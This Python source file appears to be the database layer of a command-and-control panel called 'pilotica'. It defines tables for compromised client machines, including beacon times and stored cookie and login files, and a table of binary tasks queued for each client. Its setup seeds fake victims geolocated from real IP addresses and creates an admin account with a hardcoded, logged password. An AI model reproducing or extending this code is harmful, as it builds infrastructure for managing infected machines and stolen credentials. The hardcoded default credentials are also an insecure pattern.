import random
from datetime import datetime, timedelta
from secrets import token_urlsafe
from uuid import uuid4 as rand_uuid
import json
import requests

from bcrypt import checkpw, gensalt, hashpw
from sqlalchemy import Boolean, Column, Integer, LargeBinary, String, Text, create_engine, ForeignKey
from sqlalchemy.exc import OperationalError
from sqlalchemy.orm import declarative_base, sessionmaker, relationship

from .identicon import generate_identicon
from .misc import generate_hwid
from .premissions import Premission, Premissions

from sanic.log import logger

Base = declarative_base()


def generate_api_key():
    return token_urlsafe(32)


class User(Base):
    __tablename__ = 'users'

    id = Column(Integer, primary_key=True, autoincrement=True)
    name = Column(String(20), nullable=False, unique=True)
    password = Column(String(255), nullable=False)
    image = Column(LargeBinary, nullable=False)
    permissions = Column(String(50), nullable=False)
    api_key = Column(String(255), nullable=False, unique=True, default=generate_api_key)
    uuid = Column(String(30), nullable=False, unique=True, default=lambda: str(rand_uuid()))

    def __repr__(self):
        return f"<{self.name}, {self.uuid}>"

    def check_password(self, plain_password: str) -> bool:
        """Validates the password against the stored hash."""
        return checkpw(plain_password.encode('utf-8'), self.password.encode('utf-8'))

    def get_permissions(self) -> list[Premission]:
        prem = self.permissions.strip()
        if prem == "" or prem == "NONE":
            return []

        premissions = []
        for p in prem.split("|"):
            premissions.append(Premission.from_string(p))

        return premissions

    def has_permissions(self, premissions: list[Premission]) -> bool:
        prems = self.get_permissions()
        if len(prems) < 1:
            return False

        for p in premissions:
            found = False
            for prem in prems:
                if p.equals(prem):
                    found = True
                    break
            if not found:
                return False
        return True

    def to_json(self) -> dict:
        prem = self.get_permissions()
        return {
            "id": self.id,
            "name": self.name,
            "api_key": self.api_key,
            "premissions": [(p.name, p.uuid) for p in prem]
        }

def create_user(name: str, plain_password: str, permissions: list[Premission]):
    """Creates a new User with hashed password."""

    image_data = generate_identicon()
    pwd = hashpw(plain_password.encode('utf-8'), gensalt()).decode('utf-8')
    str_prem = []
    for p in permissions:
        str_prem.append(p.to_string())
    user = User(name=name, password=pwd, image=image_data, permissions='|'.join(str_prem))

    return user

class Client(Base):
    __tablename__ = 'clients'

    id = Column(Integer, primary_key=True, autoincrement=True)
    hwid = Column(String(40), nullable=False, unique=True)
    time = Column(String(20), nullable=False)
    ip = Column(String(20), nullable=False)
    geoloc = Column(String(100), nullable=True)
    mac = Column(String(20), nullable=False)
    hostname = Column(String(20), nullable=False)
    cpu = Column(String(100), nullable=False)
    checked = Column(Boolean, nullable=False)
    last_beacon = Column(String(20), nullable=False)
    software = Column(String(20), nullable=False)
    cookies_file = Column(Text, nullable=False)
    logins_file = Column(Text, nullable=False)

    def to_json(self) -> dict:
        """Convert the client object to a JSON-serializable dictionary."""
        with SessionLocal() as session:
            task_count = len(session.query(Task).filter(Task.client_id == self.id).all())
            geoloc = self.geoloc
        return {
            "id": self.id,
            "hwid": self.hwid,
            "time": self.time,
            "hostname": self.hostname,
            "ip": self.ip,
            "geoloc": json.loads(self.geoloc) if self.geoloc else None,
            "cpu": self.cpu,
            "mac": self.mac,
            "checked": self.checked,
            "online": self.is_online(),
            "software": self.software,
            "task_count": task_count
        }

    def is_online(self) -> bool:
        """Check if the client is online based on the last beacon time."""
        last_beacon_time = datetime.strptime(self.last_beacon, "%d-%m-%Y %H:%M:%S")
        return datetime.now() - last_beacon_time < timedelta(minutes=5)

def create_client(ip, geoloc: dict, mac, hostname, cpu, software, cookies_file, logins_file):
    hwid = generate_hwid(mac, hostname, cpu)
    time = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    client = Client(
        hwid=hwid,
        time=time,
        ip=ip,
        geoloc=json.dumps(geoloc),
        mac=mac,
        hostname=hostname,
        cpu=cpu,
        checked=False,
        last_beacon=time,
        software=software,
        cookies_file=cookies_file,
        logins_file=logins_file)

    return client

def get_new_clients_count_last_24_hours() -> list:
    """Get the count of new clients for each of the last 24 hours."""
    db = SessionLocal()
    try:
        now = datetime.now()
        counts = []
        for i in range(24):
            start_time = (now - timedelta(hours=i+1)).strftime("%d-%m-%Y %H:%M:%S")
            end_time = (now - timedelta(hours=i)).strftime("%d-%m-%Y %H:%M:%S")
            count = db.query(Client).filter(Client.time.between(start_time, end_time)).count()
            counts.append(count)
        return list(reversed(counts))
    finally:
        db.close()

def get_total_clients_count_last_24_hours() -> list:
    counts = get_new_clients_count_last_24_hours()
    db = SessionLocal()
    try:
        current = len(db.query(Client).all())
        totals = []
        for count in reversed(counts):
            current -= count
            totals.append(current)
    finally:
        db.close()

    return list(reversed(totals))

class Task(Base):
    __tablename__ = 'tasks'

    id = Column(Integer, primary_key=True, autoincrement=True)
    creation = Column(String(20), nullable=False)
    type = Column(String(10), nullable=False)
    content = Column(LargeBinary, nullable=False)
    name = Column(String(10), nullable=False)

    client_id = Column(Integer, ForeignKey('clients.id'), nullable=False)
    client = relationship("Client", backref="tasks")

    def to_json(self) -> dict:
        return {
            "id": self.id,
            "created_at": self.created_at,
            "type": self.type,
            "client_id": self.client_id
        }

def create_task(client: Client, task_name: str, task_type: str, content: bytes) -> Task:
    task = Task(
        creation = datetime.now().strftime("%d-%m-%Y %H:%M:%S"),
        type=task_type,
        content=content,
        client=client,
        name = task_name,
    )
    return task


# Database setup
DATABASE_URL = "sqlite:///./pilotica.db"  # or any other DB URL

engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

ips = ['178.217.40.1', '154.206.12.1', '40.0.0.1', '104.28.158.171', '157.167.132.1', '213.251.36.1', '192.43.189.1', '157.167.230.81', '104.76.16.1', '107.149.214.1', '13.95.0.1', '205.234.232.1', '92.123.245.181', '118.193.62.1', '45.127.180.1', '52.102.33.191', '170.50.0.1', '104.103.71.171', '87.245.234.91', '52.94.252.1', '192.5.36.1', '194.56.182.1', '66.251.218.1', '17.255.128.1', '5.183.129.1', '162.120.128.31', '203.27.128.1', '70.53.136.1', '155.190.128.1', '31.170.176.1', '157.167.237.101', '178.38.88.1', '76.74.11.1', '212.3.231.121', '159.20.128.1', '204.89.239.1', '155.46.182.1', '23.103.225.1', '103.134.128.1', '213.118.0.1', '104.125.212.1', '40.99.226.191', '157.167.226.1', '75.189.111.191', '104.28.131.41', '52.98.149.1', '208.97.203.191', '40.64.145.121', '104.134.21.1', '93.113.109.231', '164.212.0.1', '185.203.48.1', '23.200.48.1', '219.83.48.1', '176.101.7.71', '93.127.220.1', '157.191.97.71', '192.189.142.1', '103.15.75.1', '149.11.96.31', '32.103.128.1', '195.118.176.1', '148.188.243.251', '217.196.98.101', '104.28.94.61', '193.251.192.1', '184.104.232.1', '195.20.159.1', '195.62.60.1', '220.158.216.1', '79.127.232.1', '103.71.24.1', '192.172.228.1', '193.53.98.1', '74.50.112.1', '154.22.48.91', '154.48.210.1', '104.28.221.1', '196.241.180.1', '13.106.230.31', '92.0.64.1', '23.95.162.1', '158.58.160.1', '217.146.88.1', '104.28.220.141', '45.140.90.1', '103.115.213.1', '104.28.139.121', '209.9.215.111', '34.124.71.61', '91.167.118.21', '202.53.146.1', '141.95.52.11', '20.47.114.1', '154.94.20.1', '40.99.55.161', '201.186.0.1', '212.90.108.1', '168.196.0.1', '82.165.197.1']

def init_db():
    """Initialize the database (create tables and default user)."""
    # Create tables if they don't exist
    Base.metadata.create_all(bind=engine)

    # Create a session
    db = SessionLocal()

    try:
        # Check if there are any users in the database
        if not db.query(User).first():
            # Create default "Admin" user with permissions
            default_user = create_user("admin", "admin01!", [Premissions.Admin])
            db.add(default_user)
            db.commit()

        logger.info("Default Login: admin, admin01!")

        # Generate 100 random clients in the last 24 hours
        if not db.query(Client).first():

            def get_geoloc(ip):
                url = f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon"
                r = requests.get(url, timeout=5)
                
                if r.status_code != 200:
                    return None
                
                j = r.json()
                if j.get("status") == "fail":
                    return None
                
                return j

            now = datetime.now()
            for _ in range(100):
                time_offset = random.randint(0, 24 * 60 * 60)  # Random offset in seconds within the last 24 hours
                client_time = (now - timedelta(seconds=time_offset)).strftime("%d-%m-%Y %H:%M:%S")
                last_beacon = client_time if random.random() > 0.5 else now.strftime("%d-%m-%Y %H:%M:%S")
                ip = ips.pop()
                random_client = create_client(
                    ip=ip,
                    geoloc=get_geoloc(ip),
                    mac=f"00:1B:44:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}",
                    hostname=f"client-{random.randint(1000, 9999)}",
                    cpu=f"Intel Core i{random.randint(3, 9)}-{random.randint(1000, 9999)}",
                    software="v1.0",
                    cookies_file="cookies.txt",
                    logins_file="logins.txt",
                )
                random_client.time = client_time
                random_client.last_beacon = last_beacon
                db.add(random_client)
            db.commit()

    except OperationalError:
        print("Database connection error.")
    finally:
        db.close()
